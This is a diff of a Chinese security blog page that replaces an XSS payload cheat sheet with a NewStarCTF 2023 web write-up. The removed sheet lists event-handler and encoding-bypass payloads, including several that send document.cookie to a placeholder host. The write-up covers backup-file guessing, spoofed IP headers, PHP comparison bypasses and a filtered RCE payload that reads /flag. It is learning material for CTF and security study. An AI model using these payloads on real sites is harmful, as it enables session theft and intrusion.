@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>xss | Secfeng</title>
-  <meta name="keywords" content=" xss ">
-  <meta name="description" content="xss | Secfeng">
+  <title>NewStarCTF_2023 | Secfeng</title>
+  <meta name="keywords" content=" buuctf ">
+  <meta name="description" content="NewStarCTF_2023 | Secfeng">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -415,9 +415,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-NewStarCTF-2023" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">xss</h1>
+        <h1 class="article-title">NewStarCTF_2023</h1>
     
     <div class="article-meta">
         
@@ -427,19 +427,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">xss</a>
+            <a class="color2">buuctf</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-08-20 19:56:55'>2023-03-28 20:37</time>
+            发布时间 : <time class="date" title='最后更新: 2023-09-26 22:28:43'>2023-09-26 20:59</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:2.5k</span>
+        <span>字数:779</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -458,7 +458,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5"><span class="toc-text">无过滤情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5"><span class="toc-text">存在过滤情况</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEEK1"><span class="toc-text">WEEK1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-text">泄漏的秘密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Begin-of-Upload"><span class="toc-text">Begin of Upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Begin-of-HTTP"><span class="toc-text">Begin of HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ErrorFlask"><span class="toc-text">ErrorFlask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Begin-of-PHP"><span class="toc-text">Begin of PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R-C-E"><span class="toc-text">R!C!E!</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -474,221 +474,105 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>xss类型：</p>
-<p>​	反射型</p>
-<p>​	存储型</p>
-<p>​	DOM型（document.write、innerHTML、eval）</p>
-<p>注：document.write可以识别Native编码</p>
-<p>同源策略：同协议，同域名，同端口</p>
-<pre><code>标签法：&lt;script&gt;alert(123)&lt;/script&gt;
-伪协议：&lt;a href=javascript:alert(555)&gt;&lt;/a&gt;
-事件法：&lt;a onmousemove=alert(888)&gt;8888&lt;a&gt;
+        <h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h4><p>题目提示泄露了一些敏感信息在Web根目录下</p>
+<p>打开后猜测备份压缩文件名，这题的是<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>下载后flag在robots.txt和index.php文件里，拼接起来即可</p>
+<p>常见备份文件后缀：</p>
+<pre><code>.index.php.swp
+index.php.swp
+index.php.bak
+.index.php~
+index.php.bak_Edietplus
+index.php.~
+index.php.~1~
+index.php
+index.php~
+index.php.rar
+index.php.zip
+index.php.7z
+index.php.tar.gz
+www.zip
+www.rar
+www.zip
+www.7z
+www.tar.gz
+www.tar
+web.zip
+web.rar
+web.zip
+web.7z
+web.tar.gz
+web.tar
+wwwroot.rar
+web.rar
 </code></pre>
-<h3 id="无过滤情况"><a href="#无过滤情况" class="headerlink" title="无过滤情况"></a>无过滤情况</h3><p>&lt;script&gt;</p>
-<pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;
-&lt;script&gt;var img=document.createElement(&quot;img&quot;); img.src=&quot;http://xxx.xxx:xxxx/&quot;+document.cookie&lt;/script&gt;  //外带
-&lt;script&gt;window.open(&quot;http://xxx.xxx:xxxx/&quot;+document.cookie)&lt;/script&gt;
-&lt;script&gt;window.location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;
-&lt;script&gt;location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;
+<h4 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h4><p>这道题直接上传一句话木马文件即可，没有过滤</p>
+<h4 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h4><img src="/2023/09/26/NewStarCTF-2023/211036.png" class="">
+
+<p>直接抓包：</p>
+<img src="/2023/09/26/NewStarCTF-2023/211329.png" class="">
+
+<p>先是让给ctf用get方式传参，随便传一个</p>
+<p>然后给secret用post方式从传参，传源代码中隐藏的一个值，要进行base64解码后再传（注意burp发包的时候哟要将请求头改为POST）</p>
+<p>第三步将power的值改为ctfer</p>
+<p>第四步将User-Agent的值改为NewStarCTF2023</p>
+<p>第五步添加一个请求首部Referer: newstarctf.com</p>
+<p>最后一步构造一个伪造ip首部 X-Real-IP: 127.0.0.1（试了一下只有这个可以）</p>
+<pre><code>Origin 指示了请求来自于哪个站点，只有服务器名，不包含路径信息
+Referer 指示了请求来自于哪个具体页面，包含服务器名和路径的详细URL
+X-Forwarded-For是告诉服务器当前请求者的最终ip
 </code></pre>
-<p>&lt;img&gt;</p>
-<pre><code>图片加载错误时触发
-&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
-&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;
-鼠标指针移动到元素时触发
-&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;
-鼠标指针移出时触发
-&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;
+<p>常见的可替换X-Forwarded-For的首部：</p>
+<pre><code>X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded: 127.0.0.1
+True-Client-Ip: 127.0.0.1
+Proxy-Client-IP: 127.0.0.1
 </code></pre>
-<p>&lt;a&gt;</p>
-<pre><code>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;
-&lt;a href=javascript:alert(&#39;xss&#39;)&gt;test&lt;/a&gt;
-&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;
-&lt;a href=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;a&lt;/a&gt;
-&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;
-&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;
+<h4 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h4><p>这关实际和Flask模板注入没关系，传入number1和number2即可再页面中找出flag</p>
+<h4 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h4><img src="/2023/09/26/NewStarCTF-2023/214505.png" class="">
+
+<p>这题有五个关卡：</p>
+<p>1、if($_GET[‘key1’] !&#x3D;&#x3D; $_GET[‘key2’] &amp;&amp; md5($_GET[‘key1’]) &#x3D;&#x3D; md5($_GET[‘key2’]))</p>
+<p>很常见，直接用数组绕过</p>
+<p>key1[]&#x3D;1&amp;key2[]&#x3D;3</p>
+<p>2、if(md5($_POST[‘key3’]) &#x3D;&#x3D;&#x3D; sha1($_POST[‘key3’]))</p>
+<p>还是直接用数组绕过</p>
+<p>key3[]&#x3D;3</p>
+<p>3、if(strcmp($_GET[‘key4’],file_get_contents(“&#x2F;flag”)) &#x3D;&#x3D; 0)</p>
+<p>4、if(!is_numeric($_GET[‘key5’]) &amp;&amp; $_GET[‘key5’] &gt; 2023)</p>
+<p>这里传key5&#x3D;2024abc就可以了</p>
+<p>5、第五个关卡里<strong>extract</strong>函数的功能是从数组中将变量导入到当前的符号表，简单的说就是将数组的键名转换为变量名，将数组的值转换为变量的值</p>
+<p>直接传个flag5&#x3D;*就可以</p>
+<h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h4><img src="/2023/09/26/NewStarCTF-2023/220811.png" class="">
+
+<p>题目的意思是让你找到一个字符串，经过md5加密后的字符串前6位是c4d038</p>
+<p>这里就只能写个脚本跑一下</p>
+<pre><code>import hashlib
+dic=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;
+flag=&quot;c4d038&quot;
+def md5():
+    for a in dic:
+        for b in dic:
+            for c in dic:
+                for d in dic:
+                    for e in dic:
+                        t=str(a+b+c+d+e)
+                        md5=hashlib.md5(t.encode(&#39;utf-8&#39;)).hexdigest()
+                        if(md5[0:6]==flag):
+                            print(t)
+                            return
+md5()
 </code></pre>
-<p>&lt;input&gt;</p>
-<pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;
-竞争焦点，从而触发onblur事件
-&lt;input onfocus=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot; autofocus&gt; //外带
-&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;
-通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;
-&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;
-&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;
-&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;
-&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
-按下按键时触发
-&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;
-按下按键时触发
-&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;
-松开按键式时触发
-&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;
+<p>跑出一个04p9l</p>
+<p>然后命令执行过滤了一些命令，但问题不大</p>
+<p>用&#96;&#96;替代system函数，用f’l’ag绕过flag</p>
+<pre><code>payload password=04p9l&amp;e[v.a.l=echo `c&#39;a&#39;t /f&#39;l&#39;ag`;
 </code></pre>
-<p>&lt;from&gt;</p>
-<pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;
-&lt;form action=javascript:alert(&#39;xss&#39;)&gt;
-&lt;form method=post action=aa.asp? onmouseover=prompt(&#39;xss&#39;)&gt;
-&lt;form method=post action=aa.asp? onmouseover=alert(&#39;xss&#39;)&gt;
-&lt;form action=1 onmouseover=alert(&#39;xss)&gt;
-&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;
-&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
-</code></pre>
-<p>&lt;iframe&gt;</p>
-<pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
-&lt;iframe onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; //外带
-&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;
-&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
-&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;
-&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
-&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;
-&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)
-</code></pre>
-<p>&lt;svg&gt;</p>
-<pre><code>&lt;svg onload=alert(1)&gt;
-&lt;svg onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;
-</code></pre>
-<p>&lt;body&gt;</p>
-<pre><code>&lt;body onload=&quot;alert(1)&quot;&gt;
-&lt;body onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt; //外带
-利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
-&lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
-</code></pre>
-<p>&lt;button&gt;</p>
-<pre><code>元素上点击鼠标时触发
-&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;
-</code></pre>
-<p>&lt;p&gt;</p>
-<pre><code>元素上按下鼠标时触发
-&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
-元素上释放鼠标时触发
-&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
-</code></pre>
-<p>&lt;details&gt;</p>
-<pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;
-使用open属性触发ontoggle事件，无需用户去触发
-&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;元素上按下鼠标时触发
-&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
-元素上释放鼠标时触发
-&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
-</code></pre>
-<p>&lt;select&gt;</p>
-<pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
-通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-&lt;select onfocus=alert(1) autofocus&gt;
-</code></pre>
-<p>&lt;video&gt;</p>
-<pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
-</code></pre>
-<p>&lt;audio&gt;</p>
-<pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;
-</code></pre>
-<p>&lt;textarea&gt;</p>
-<pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;
-</code></pre>
-<p>&lt;keygen&gt;</p>
-<pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐
-</code></pre>
-<p>&lt;marquee&gt;</p>
-<pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以
-</code></pre>
-<p>&lt;isindex&gt;</p>
-<pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE
-</code></pre>
-<p>利用link远程包含js文件</p>
-<pre><code>在无CSP的情况下才可以
-&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;
-</code></pre>
-<p>javascript伪协议</p>
-<pre><code>&lt;a&gt;标签
-&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;
-&lt;iframe&gt;标签
-&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;
-&lt;img&gt;标签
-&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下
-&lt;form&gt;标签
-&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;
-</code></pre>
-<p>expression属性</p>
-<pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下
-&lt;div style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下
-&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下
-</code></pre>
-<p>background属性</p>
-<pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效
-</code></pre>
-<h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><p>过滤空格</p>
-<pre><code>用 / 代替空格
-&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;
-</code></pre>
-<p>过滤关键字</p>
-<pre><code>大小写绕过
-&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;
-双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)
-&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;
-字符拼接(利用eval)
-&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;
-字符拼接(利用top)
-&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(只有两个``这里是为了凸显出有`符号)
-</code></pre>
-<p>其他字符混淆</p>
-<pre><code>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
-下面举几个简单的例子
-可利用注释、标签的优先级等
-&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;
-&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;
-&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
-&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;
-</code></pre>
-<p>编码绕过</p>
-<pre><code>Unicode编码绕过
-&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
-&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;
-url编码绕过
-&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;
-&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
-Ascii码绕过
-&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;
-Hex绕过
-&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;
-八进制绕过
-&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;
-base64绕过
-&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;
-&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
-</code></pre>
-<p>过滤双引号，单引号</p>
-<pre><code>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
-&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;
-使用编码绕过，具体看上面列举的例子
-</code></pre>
-<p>过滤括号</p>
-<pre><code>当括号被过滤的时候可以使用throw来绕过
-&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;
-</code></pre>
-<p>过滤url地址</p>
-<pre><code>使用url编码
-&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;
-使用IP
-&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制
-&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制
-&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制
-&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://
-使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)
-使用中文逗号代替英文逗号
-&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www.baidu.com``&quot;&gt;//会自动跳转到百度
-</code></pre>
-<p>htmlspecialchars() 函数实体化HTML</p>
-<pre><code>q&#39; onclick=&#39;alert(123)    //没有实体化引号的情况下
-</code></pre>
-<p>注：innerHtml不会执行script和svg标签</p>
-<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p>
-<p>拓展链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p>
-<p>xss防御：</p>
-<p>​		1、过滤</p>
-<p>​		2、httponly -&gt;让js无法读取到httponly保护的cookie字段（可以找到探针phpinfo）</p>
-<p>​		3、HTML实体化（转义）</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
